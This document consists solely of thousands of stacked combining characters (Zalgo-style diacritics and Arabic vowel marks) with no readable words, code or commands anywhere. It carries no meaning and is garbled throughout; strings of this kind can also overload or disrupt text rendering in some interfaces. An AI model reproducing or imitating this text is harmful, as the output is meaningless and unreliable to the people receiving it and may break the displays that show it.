̸̵̵̷̶̷̴̴ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̢̧̨̨̧̢̡̛̛̳̙̦̹͖̪͍̝̣͇̯̘̺͓̲̩͖̼̯̣̪̪̞͓̯̱͇͕̽͊́̈́͆ͮͭͩ́̀ͯ̓ͪ́ͯ̒͋͑ͧ̆̉̾ͪ̑̏̆́̀ͩ͆̐ͬ̀ͪ͒͋͑̆̆̚͘͘̕͘͢͜͜͢͢͢͜͠͠͝͞͡͝ͅͅ͏ًٌٍَُِّ̺̬͗ͬ̆͞͠҉̴̸̶̴̵̸̴̷ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُُِِِِِّّّّّ̨̡͍̣̮̯̪͔̗̗̦̮ͭ̆͑̓ͧ͂͒̂͐͌̔̊̓̀͌̊ͨ͗ͮͫ̉͟͟͢͞͞͠ͅͅ͏ٌٍَِّ̺̜̥̓͞͏ً̩͏̴̷ًٌٌٍَُُِّ͚̜͉͗̒́̿͑͐͢͠͏̶̴̶̶̶̷̴ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِِِّّّّّّّّّّّ̧̡̢̨̛̛̹̭̤͍̳̘͓̳͓̜̪̰̱͚͙͚̫͙͙̻̮̫̜̟̘͈̭̤̻̗̰͔̪͎ͪ̀ͬ̐̓̒ͣ̄͋̀̅ͣͫͮ̾̃́̈́ͫ͗̔͆̾ͯ̑͂͛ͥ̏̉ͦ̈́͑̔͗̀ͤͤ̎͘͘͘̕̕͘͘̕͟͟͢͢͢͢͞͝͠͝͝͡͝͠͞͠ͅͅ͏̴̴̵̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّّ̢̢̨̨̜͈̻̠̩͔͉̘̣͚̱͙͍̭̟̻̜̳̟͙͇̄ͣ́́͊͊ͥ́̓̈͂́ͤͭͨ͆ͩ̀̏ͭ̃͘͘͞͝͝͞͝͏̷̴̷̸̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّ̡̧̛̭͇̠̪̭̩͓͈̤̠̫̦̟̹͎̹̩͈͎̆̓̈ͮ͋̽̎ͪ̒͊͗̉̂ͩͥ͆̈́̄̍͒̒̌̂͌̄ͣͣ̏ͬ͑͘͘͘͘̚͜͜͢͠͞͞ͅ҉َّ̦̎͐͏̷̸ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̛̯̯̝͔̳̣̜̲̦͂́ͤ͛ͫ̂̂͑ͤͬ͆̍͊͘͘̕͟҉̷̶̵̷̷̸̵̴̴̴̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̨̨̢̡̢̢̛̱͔̤̞̺̹̞̯̰͔̪̥͙̰̯͈̩̱͈̼̖̜̱̺̞̦͖̯̭̄ͮͣ͐̄̒̈́̓͆̀͑͑̿̄ͣ̋̈́͆ͫͪͫͪ̑ͣ͂̔̀͑ͫ́̕̕̚͢͢͟͜͜͝͠͡҉̴̴̸ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُِِِِِِِّّّّّّّ̡̡̡̢̨̡̛̛̲͇͕̖̘͎͙̥͎̠̜̙̤̱̖̖̤͔͉̹͕̝͚͕͔͊̅̋̄ͦ̎ͬ̌͒ͧ͑͊́͛͆̔̀͛͛̓̀̃́͊̀̄ͧͦ͛͘̕͜͡͡͠ͅͅ͏̶̸̵̴̷̵̶̶ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̢̧̡̡̛̻͎̹͈̥͇̗̺͇̰̮̩̘̖̪̗̝̻̯̝̖̯̖͎͇̲̳̯̲̋͌̑̽̿̏̀͌ͧ͊̌̓ͣ́̀̀͒͛͛̑̌ͣͪͣ̆̔͆̒̈̽ͤͥ́̒ͬ̕̕͢͟͟͢͜͟͢͢͟͢͠͝͞͝͝͠͝͡͝͝ͅ҉̷ًًًٌٌٌٍٍٍٍَََُُُِِِّّّّ̨̨̨̧̛̝͉̮̹̗͇̠̹͇̳̻̲͎̈́ͫͫͥ́͌̽ͩ̓̐̕͜͠͝҉̶ًًٌٌٍٍَََُُِِّّ̧͕͈̺͎̩̰̭̖̯̎́ͭ̊͐́͋̀̕͢͢͝͏̸̵̴̵̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُُِِِِِِّّّّّّ̨̡̨̛̹͈̙̬͈͖̖̬̠͇͈͖͎͈̼̙͖̼̱͈̀̊̓ͧͥ̀ͦͤͣ͑̎̒ͭ̉̿̉́ͬ͂̄ͫ͘̕͢͝͞͠͠͝͠͝͝ͅ҉̷̵̴ًًًًًًٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُِِِِِِّّّّّّ̧̨̡̨̛̖̗̹̹̦̣̝̜̠͍̣̞̠̟ͩͮ̀͛̆̓͆ͮ̓̍̂̽̊̿ͫͯ̂̋ͯ͋͘͘̚͟͜͢͟͟͞͡ͅͅ͏̶̵ًًًٌٌٌٌٍٍٍَََُُُُِِِّّّ̨̧͍̱̳͔̯̙̼͕̮̠̙͇ͨ͗́ͤͮ̍̑ͯͯ̓̋̚̕̕̕̕̚͟͢͢͏̴̵̵̵ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̧̢̧̛̻͖̱̘͔͇͖̗͍̗̳̲͙̺̩̰͈̤͖̣̲ͮ̊̆ͩ̃̉̀̒̌̈ͬͦ̆́͌̔̇͘̕͜͡͠͞͝ͅ҉̴ًًٌٌٍٍٍََُُِِِّّ̛͉̣̥̙͇̥̰̮̣̑̽̿͗͌̐͑́ͩ̄̚͡͏̵̷̴̴ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̡̧̡̢̨̡̧̨̡̡̨̯̫̠͔̦̯̱̻̬̯͉̗̮̠̜͙͓̦̜̪͕͍̙͉̎̈́̉̑͐ͬ̓̄͊͂̋͋ͦ̒̐̓͌́ͪ̈ͧ͊͂ͪ̐̀̽́ͣ͑͆ͧ͑ͨ͐ͮ̚͟͢͢͟͟͡͡͞͞͝͠҉̴̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̛͙̺̤̜̪̥̦͙̫̙̒̍ͤ͗̍̅̕̚̕͟͡ͅ҉ًًٌٍََُُِّّ̧̢̛͕̯̼̯͕̣͈̮́̽̇ͭ͘͢͡͏̸ًًٌٌٌٍٍََُُِِِّّ̡̧̨̛̞̙̼̟͙͖̤͈ͩ̾ͬ̂̈͒͒̚̕͢͝͞͡͏̴̶̷̸ًًٌٌٍٍََُُِِّّ̛͎̣͍͈͈̱̱̍̔ͨͣ̊̚͘̚҉̴̷̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̨̨̡̛͇͕̬͇̤͎͇͍̟̞̘͓̣͍̗̤͈͑̐ͮ̐̇̎ͦ̃ͮ̃̋ͤ͐ͤ́͝͠͏̴̴ًًٌٍٍََُُِّّ̧̡̢̨̜͈̯̞̻͇ͮ̇̈́̂͌͗͏̷̶ًًًٌٌٌٍٍٍَََُُِِِّّّ̧̡̛̤̙̩̺̠̭̩̫͎͋̓̾̑̿̀ͧͮ̒͟͠͞҉̶ًٌٌٍٍَُُِِّّ̡͇̰̜̙̱͕̖̊̅̍ͣ̉̚͟͠͞҉̶̷ًًٌٌٍٍََُُِِّّ̗̱̪̠̱̹͊̒̀͊̈́͊̀̃͢͞͞͡͏َ͇ͤ҉̶̸̴̸̶̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّّ̨̛̛̟̪͖̞̥̦̝͖̠̤̩͍͚͇̘͖̟̭̭̩̦͓͐̊͆͛ͩ̎̐͂̀̀ͫ̀ͩ̿̃̽̆̐͋̈ͯ̍̀ͩ͘͢͟͡͠҉̸̴ًًًًٌٌٌٌٍٍٍََََُُُُِِِّّّ̧̢̨͔̣͚̗̭̞̮̰̲͖̟̪̥͉̟͑̽́ͪͭͭ̈́̽̑ͨ̿̊́̍̆́̓͟͞͠҉̶ًًٌٍٍََُُِِّّ̢̡̰̹͙̖̹͔͖̜͍̏́ͯ́̓͟ͅ͏̸ًٌٍَُِّ̹ͩ͂̄̽̕҉̵̸ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̢̛̛̞̫̲̩̹̬͔̦̙͈̜͔̹͓̥̙̣͑̉͊͂̍ͤͤ̓̒͒ͬͨͮ̌͝͡͝͏̴̴̴̷̷ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُِِِِِِِّّّّّّّ̨̧̡̛̛̲̪̝̦̟̥̫̯̳̲̻̠̞̮̭̠͔̲͔͖͔̳̙̞̥͇̱͔̉̏̿̋͐̊ͫ̔̈́̆ͧ̒̀̈́ͣ͂̌̿̇̌̂͆ͭ͗͆͌̕̕͟͟͟͜͢͡͞͝͞ͅ͏̸̵ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̢̼̩̯̫̖̣̱͚̠̜̦̹̝̯̎́̉̎ͧ̓̎́ͣͬ̚͞͡ͅ͏̵ًًٌٌٍٍََُُِِّّ̨͚͖͙̰̱̩̮̥͎̯̾̓ͥ͛ͫͥ̾͜͡͞͏̶̶̷̸̷̷̷̴̷̴̴ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̢̢̢̨̢̢̨̛̺̱͕̟͉͎̙̲͖͖̟͕̝̻̺̪͖̜̠̰̟̩̟̺̳̙̲̹̪̖̩͔̞̥ͧͨ̊̃͊́͋̿́̑͋ͦ̓ͪ̌ͣͮ͊͌̄̆ͬ̈̋̐̀̒̊̐͌̄̐̽̌̈́̋͆ͨ̐̽̉ͪͨ͘̚̕̚̕͘͢͢͟͟͡͞͝͡ͅ͏̷̸̷̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̧̨̢̧̛̘͙̲̺̫͚͍͎͓̟͇͎̦̯͖̱̮͉̳̱̯̦̥̭͇͍̣͕̻͔̞̽͋͋̌ͭͥ͋͗̉ͥ̑̃̓̀́͌ͬ̒ͤ̎͗ͯ͑ͤ̀ͩ́̌̀ͮ̂̓͆ͬ̀͘͘̚̕͘͘͟͜͟͟͜͝͞͞͝͡͠ͅ҉ًَُّ͍̬ͨ̓͝͡͝͏̴̴̵ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̡̨̡̪̮̻̫̫̤̯͈̬͉͉͍̙̜̳̪͇ͪͬ̈́̆̊̆̓́̀͆̽̇͂ͩ͆ͪ̾͐̀́ͮ̂͘͜͢͟͝͝͝ͅ҉ّ̝҉̴̴̵̷̴̶̴̵̸̷̶̷̷ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̨̢̨̧̨̡̧̛̙͔̰̹̟̯̟̘̬͓̞̠͕̪͍̭͍̹̯̘͙̜̖͈̳͍̤̪͍͓̥͇͉̦̰̰̠̳̺̥͎̩͉̍̌̀̏͋̇́͗̌ͯ̈́́ͯ͂͛̍̂̿͋̋ͭ̅͒͊́̀̽̔̀͑ͬ̌̂͛͛̄̽̃̄ͯͨ͘̕͘͟͜͜͟͢͢͢͠͞͞͞͠҉̶ًًٌٌٍٍَُُِِّ̲̙͔͕̯̻̘͎͊ͤ͂ͩ͒̿͜͟͝͏̶ًًًٌٌٌٍٍٍََََُُُِِِّّّّ̡̢̧̨̡̛̛̛͍̳̗̥̰͇͙̗̘͋͗̑̓̀̂ͩ͗̕͟͝͞͞ͅ҉̶̸̵ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّ̨̧̧̨̢̢̡̢̖̤̰̗̹̺͙̳̰̪̹̮͓͎̦͇̦̞̞͓͖͔̬̣͕͎̰͕̥̙͕̯͐̋ͧ͆́͐́̉͑ͭ͋͌ͫ͂ͥ̊̉̃͛͆ͯ̋ͬ̇ͨ̑̆͌́̓ͥͪ̇͐̕͘͘̚͢͢͜͜͢͟͡͠͞͠͞͝͠͝͝͠ͅͅ҉̸ًَُّ̤̫̘ͫ͋҉̸̴̴̶ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̧̨̛͖̪̻͇͓̰̭͎͖̼̗̰͉̩̹̤͒ͩ̊̈͐̀̏ͥ̄̊͆̓ͥ͘͘͟͠͝͝͝͠҉ًٌٍٍَُِّّ͚̖̅̓̆̍͞͏̷̵ًًًٌٌٍٍَََُُُِِّّ̡̡̛̦̲͈̳̳̗̔ͧ̔ͫ̋̅͒̓̔͜͢͡͠͡͝͝ͅ͏ٌِ͔̃͏ًًٌٍٍََُُِّّ̘̹̗͖̙̬̺ͧ́ͣ̈ͥ͑͘͏ًٌٌٍٍَُِِّ̡̢̫̣̀̔ͬ̉̕͟͞͝ͅ͏ًَّ̝̉҉̵ًٌٌٍٍَُُِِّّ͉̰̹̮̯̟͓̝͔̎́͆̊̂̌͟͟͝҉ًٌٍَُِّ̘̱̬̩͂ͭͬ҉̷ًٌٍَُِ̳̞̮̄̎̂ͣ͢͝͏̵̶ًًًٌٌٍٍَََُُُِِّّّ̢̡̢̫̲̪̫͍̙͉̘͉͍͓͂ͭ̏ͣ͘͟͜͢͝͠͏ٌ͎̄҉̵ًًٌٌٍٍٍَََُُِِِّّّ̨̨̧̨̧̡̡͖̙̗̪̰̤ͯ̂̓ͩ̄ͧ̋̇͆̉ͣ͟҉ًًًًٌٌٌٌٍٍٍَََُُُُِِِّّّ̨̰̣̦̠̰̰̝̱̫̜̝͔͖͉̋͊́̈̈́͑ͯ͛̀̀ͪ̽ͥ̅̑̕̕͟͜͢͝͠͞͠͞͠͡͠͝͏̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̨̨̠̻̳̺̲̻̻̯͍͈̳̩ͯ̀̄̽ͤ̔́̅͌̀͘͞͏̶̴̷ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̧̨̨̨̛͖̮̣͕̫͇̖͉̣͓̥͈̲͙̈́ͧͫͭͣ̽ͬ̈́̐̽̌̑̄̂͛̈́̀̍̎̕͘͜͡͡͝ͅ͏ًٌَُِ͙̈́͜͡͞҉ٍّ҉̵ًٌٍََُِّ̤̥̗͒̈̋̀͂͟͏̶̷̴ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̛̛̛̛̯̳̟̯̦͓͎̲̺͎̯̣̜̈ͤ̒̂̅̀͐́̽́̏ͬͮ̊̕̚͢͢͟͡͝͡ͅ҉ٌٍَُِّ̢̻̙͛͋́͗͑͞҉ًًٌٌٍَُُِِّ͙̜̱͇̜̔͐̐̐͗̓̕͘͜͝͠͏ًٌٍَُِّ̛͇͙̼̫̘ͧ̀̒̀ͤ̓̚̕͢҉̶ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّّ̡̧̨̡̠͉̙̖̖͔̙͈̲̹͖̤͚̔̏̏̃̍́ͩͨ́ͫ̏̇ͪ̽̔̆́́̀͘̕͢͢͠҉̷̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̡̡̛̗̰͙͖͉̼͕̝̦͙͚͇̪̗̺̹͍̰̹ͫ̍́ͬ̈́ͥ̈́̇̌́̈̂̄̍́̀̇̏͑̎̔̽ͪ͘̚͟͟͢͠͠͞͡͡͝͝͠͞͠͞ͅͅ҉̸̵̵̷ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّ̧̨̧̢̛͉͈̻̫͓̹̦̝͉̙̲̘̪͇͔͎̙̦̩̳̟̙̥ͤͪͥ̑̈́̀̌̾̈́̈͋͒͌́ͧ̂ͧ̚͜͜͜͞͞͏̶̶̵̸̸ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̡̡̛̛͉̦̱̯̻̜͍̳̖͎̜̪͖͙͖͉͈̣̖̗̾̔̈́̆ͫ̈́̎͗͌͑̎̃ͥ́̓̒̍́̋ͦ͛͜͜͜͟͝͠͝͏̷̸̸̶̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̛̖͉̱̲̖̟̫̖͖͔̜͉͈͎̩̥̥̹̿ͩ̂ͮ̏ͣ͒̈̃͂̈ͪ̕̚̕͘͟͝͏̸̷̷̵̴̷ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̢̦̬͔͖͕͚̦̘͙͈̙̬̙̩̻͍ͪ͒͋ͯͨ́̀̎̅̈̋ͪͮ̇̾ͥ͂̀́ͫ̽̕͢͝͠͡͞͠͞͞͠͏̷̶̷̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̧̨̨̨͓̹̩̗͓̖͖͚̺̟̲̹̥͍͉̜̺̙͎͉̗̘̲̺̓̎̅ͨ̿͗ͮ̇ͦ̽̑̃̀ͪ͑̐̄̂̀̃ͮ̀ͦ̉͊̒ͪͣ͂ͧͥ̚̕͘͘͘͘͟͜͝͝͞ͅ҉̷̵ًًٌٌٍٍٍََُُِِّّّ̛̤̤̟͇͔̹̒͆͆̀̍̿͌͝͝҉ًَ̐͠͏̶̶̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̨̢̢̛̯̦̩̪͚̬̖̯̦͖̞̰̦̘͓̭̹̹̙̩̝́̈ͮ͐͋ͧ͂͂̎̇̄̂́̔̂͑͆́̚̕͘͠͞͡͝͠҉̶̴̷̶̶̸̴̸̸̶̵ًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّ̧̡̧̧̢̨̡̧̨̧̨̧̛̛̛͍̜͎̼͎̱̹̦̹͍̜̟̜͉̳̣̣̹̭̠̠͔̖̘̯͓̘̹͍͇̳͕̞̳̞̯̼̪̫̼̬̫̦̳͚̞͇̪̣̰̍́̊̀ͨ͂ͮͭ̌̽ͯ̀͂͛̂̐́̐̓̾̈́̎̊ͥ͂͐ͫͨ̆ͬͮ̑̐̊͒͆ͣ̍̋̿̐̀̐̓ͩͨ͒ͭ́͛̈ͩ̑͊̎ͯ̂͊̒ͩ̕̚̕̕̕̚͘̕͟͟͜͟͟͜͟͜͜͟͢͜͟͠͝͞͞͝͡͝͠͝ͅͅ҉̶ٌٍِّ̥̗ͪ͋͠҉ًَُ̧̮̮̀͡҉̸̷̵ٌٍَِّ͓͙̙͚̪̊͛҉̵̴̸̴̴̸ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̨̛͉̬͎̦̝̘͕̤͓͖̹̞͎̱̓̉ͫ̇ͩ̾̏̀̕̕͝͠͝͞҉̶̴ًًًٌٌٍٍَََُُُِِّّّ̢̢̧̛̣͎̟̤̮̲̰̃̏ͬ̈́͊̿̾ͥ̈́̕͟͜͢͞͞҉̸̸̵̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّّ̢̢̢̛̛̩͖̫͎̘̞̯̬̤̜̣̰̣̼͓̝̯͈̹̠̫̏̀ͥ̾ͮ͐̒̇ͩ̄̽ͯ̇́́̔̀͑̀̽͜͜͢͝͞͏̶̸̶̷ًًًًٌٌٌٍٍٍََََُُُُِِِّّّ̛̗̳̞͍͔͚̪͔̠͗ͤ̅̄ͥͪ͂ͭ̀́̈̓͂͘̕͜͜͏̴̵ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̡̢̡̨̛̣͙̬͕͇̖̥̥̩̲̗̹̘̹͕̰ͤͪ̓́͐͐ͫ̀̈́ͫͦ̃ͧ́͛̎ͥͫ́̇̅͘͘͜͢͡͞͏̸̴̴ًًٌٌٍٍََُُِِّّ̡̨̗̮̞̭̙̤̎̑̒ͧͧ̓̌͂̑ͦ͞͝҉̶̶̸̷ًًٌٌٍََُُِِّّ̯̳̠̞̲̈̽ͦͯ͘͡͡͏ًًٌٌٍٍٍََُُِِّّّ̨̧̳̠̠̰̹̫͔̽́̆̊̓͊̕͘͟͜͠͏̴̶̸̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̧̧̡̡̡̨̧̢̛̜̺͓̞͚̯͔̮̘͇̮̼̖̲̙̮̱̠͈̥͚̣̤̘̘͚͖̘̲̖͉̀̀ͬ͐̌̉̂ͤ͊ͩ͒̓̑̐̓̀̍̌͗ͨ̅̔ͦͯ̉̃̈̋̇̕̕̕̚͘̚͟͜͢͡͞͠ͅ͏ًٌٍُِّ̛̓͋̈͜͜҉̸̵̵̴ًًًًٌٌٌٍٍٍََََُُُِِِّّّ̨̞͚̮̻̱̘̝̫̯̱͉̋ͤ̋̇̆ͬ̃ͯ͌́ͮͤ̀̒̎̕̚͢͢͡͠͡͡͠ͅ͏̷̴̷̶ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̧̡̦͉̜̥̖̞̫͓̮̩͕̖͚̼́̐̈͌̾͋̏ͯ̐̅̇͘̕͟͟͞͞͏ٍَّ͍̎̈̿͢͏ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̛͈̝̦̩̻̯̰̥̖͇̬̙̫͇̊̔̃́ͪ̇ͫ̆̐ͬͫ̊̋̕͢͠͠͞͏̶ٌٍَُِّ̲̖̹̄̔҉̶̴̶̶̴̶̷̷̷ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̧̜̘̝̩̖̘̳̣̦̩͈̙̤̘͎̣̗̘̬̉̌̂ͦ̿̔̇͊ͯ̄̈ͫ̀̌̽̈́̊ͪ̚͟͟͟͟͢͢͡͠͠͞͏̵̴ًًٌٍٍََُِّّ̛̹̬̠̦̮̲ͨ͋͌̎͛́͞͏̶̷̸̶̶̷̸̶ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُُِِِِِِِّّّّّّّ̧̡̧̡̨̧̛̤͎͖̳͙̞̮͕̦̦͚̻̣͉͕͎̠̦̭͙̙̯̪̌ͪ̐̌̀̿ͣ͐̓̌́ͣ͐̉̀ͩ̀ͪͮͪͬ͐ͫ̏ͦ̒͛̒̋̕͘̕͜͢͟͜͞͠͏ًًٌٍََُُِّ͕͕̠̲͛̅̀̀ͤ͠͡͞͏̷̸ًٌٌٍٍََُِِّّ̡̧̥̬͇͖̫̣͓̖̹ͮ͊̊ͦ̃͋͠҉̸ًًٌٌٍَُُِّ͈̖̪̹̜̗̊ͥ̉̀̇̔͘͢͜҉̷̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̜̱̺͉̻̩̝͖͉͈̰̭̂ͮ̔̔́̃ͤ̒͑͋̉̾͢͜͟͡͝͡҉̵̸̶ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̧̧̧̧̛̠͖̰͈̱̺͇̜̤̱̩̱͖͚̼̫͕͉̪͒̋̅ͣ̓̾̀̂ͮ́̿ͪͬ̿̑͛̅̓ͥͦ̀̕͜͢͠͝͏ٌٍُِ̫̍͟͡҉̶̴̸̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̢̡̢̡̛̛̛̛̳̲̦̗̼̦̖̬͚͖̗̟̖̗̳͎͓̣̺̰͖̱͓͉͈̝̟͉̫͇̦̔͗͂̀͐ͧͬ̆̇ͮ̀ͯ̿́ͨͨͪͣ̌̆͘̚̕͟͜͟͞͞͡҉̸̷̷̴̶̶̷̸̸̶̸̴̷̴̶̷ًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّ̡̨̢̢̡̡̨̡̨̡̨̨̡̢̡̨̧̛̛͙̮̳̰̬̤̬͙͙̣̟̠̹̩͖͇̰̱͔̩̤̗̞͖̩̦̘̞̺͈͚̥̪͕̖͉̬̰͖̘͉̻̩͓̼͙̜̱̳͉̯̬̞͎̬̼͇̝̦̰̭̩̖̝͔̦̞̤̠̟̘̳͕̯̯̝̰͔̼̔͆̓͐͐̎̐ͩ̃ͧͩ̽̇̇̋̽͐̾̿̋ͯ̄̉͋ͪ̏̀̓̍͌͐ͧ́̀̉̇͗̎̏͋̓̀͌͗̍ͯͬͥ̒ͯͬ́̉ͤͪͫͯ̓ͫ͐͗́͂̀ͫ͒̈̉̅̈̀͒̎̊͘̚̚͘̕̕̚̕͘͟͢͟͟͜͜͡͡͝͠͝͞͞͝͠͝͠͡͝͞͝͡͞͠͝҉̸̸̴̴ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّ̣̫͓̼̘̮̞̭͖̱̻̝̯̤̟͊͑̃̉ͩ͑́̀͐̏͐̈͂͂͊ͯ̿̍͐͗ͣ͑͆͑̋͢ͅ͏̷̶̸̶̷̷̸̷̶̷ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّّ̡̨̧̧̧̡̡̛̦͖͇͖͓͉̩̝̰͍̼͉̲̖̦̺̲̠͔͙̹̰̣̘̖̪̝̜̔ͬ̋ͦ̄̓̈́ͣ͒͌ͤͧ̿́̀̾ͣ̊̉͐́̑ͩ͑͊͜͟͠͡ͅͅ҉̶̸̵̷̵̶̶̴̶̶̶̵ًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََََُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّ̧̨̧̨̨̧̨̡̢̨̛͎̗͙̹̫̝̺̟̞͉̳͙͍̼̲͎̼̻͎̻͈̪͓̥̱̖͖͖͍̟̦͓͙̲͖̟̩͇̤̰̘̖̟͉̹̥̫̞̥̤͕̮̥̺̥̗̭̥̻͍̣̗̲̗͉̬̙̥̥̄̀̊̓͋ͧͧͦͭ́͆̋͑̀̀̉̃ͩ̋͐ͦ́ͦͤ͛ͫͮ͛ͦ̎̐̈́͆ͦ̂ͮ̅̌̀͗̇̏ͭ̀͐͛̀̑ͥͫ̓̒̔̈͆̓̄̒͊ͪ̇͌̉ͤ̎̇ͭ́̏ͭ̽͘̚͘̕̚͘̕̚͘̚͘͟͜͢͢͟͢͟͢͞͝͞͡͞͠͞͠͝͞͝͝͠͝͠͞͝ͅ҉ٍِّ̜͛͢҉̸̴ًًٌٌٍََُُِّ̢̼͓͔͚̜̙͖̄̇ͧͬ̍͜͡͡͏̶̴̵ًٌٍٍَُِِّ̨͚̦̗̺̖͚̀̋͒̄҉̶̷̷ًًًٌٌٌٍٍَََُُُِِّّّ͓̼͓̝̮̳͇͌̅́͋̇̽ͬ̔́̆͗̊̕͢͜͢͞͞͏̴̷̵̸ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̰̮̺̫̙̯͕̗̮̳̜̥͓̳̜̼͔̿̋ͨ̀̉̎̓ͫ̅̈ͮ̒ͪͥ̽̀͆̐ͥͨ̓̕̕̕͜͢͜͢͠҉̴ًٌُ̗̭̔̀͏̶ًٌٍٍَُِِّ̛̜̗͎͕̗̳̮͔̎̿͗ͭͪ͘͞҉̷̸ًٌٍَُِّ̨̛͉̘̭̝̱̮͋͒͑̉͌҉̶̵̷ًًٌٌٍََُُِِّّ̧̡̢̢͉̙̜̩̙̺̘̙̖̒̈́̂ͦ́̅ͦͭ̚҉̵̷̸̸ًًًًٌٌٌٍٍٍٍََََُُُُِِِّّّّ̢̢̢̨̢̲͇̻̺̰̦̫͈͖̹̹̞ͦ̉͗̓ͥ͌͐ͣ̾ͮ̄̉͜͞҉̸̸̶ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̨̛̛͍̤̯͚̳͖̻̮̟̱̼͍̲̠͖̠̻̞̼̝́ͯͬ̀ͪ̓ͪͭ̏̽̔ͩͤ̚͘͢͢͠͠͠͡͞͠͞͠҉̷̸̸ًٌٌٍَُُِِّ̟͖̯̪̥͇̰̣͑̐ͦ̈̀̄̈͘҉ٍ̩̿҉̶̶ًًٌٌٍٍََُُِِّّ̢̢̼̭̥̣̳͍̊̃̍̑ͨ̎̀͌̽̚͘͜͟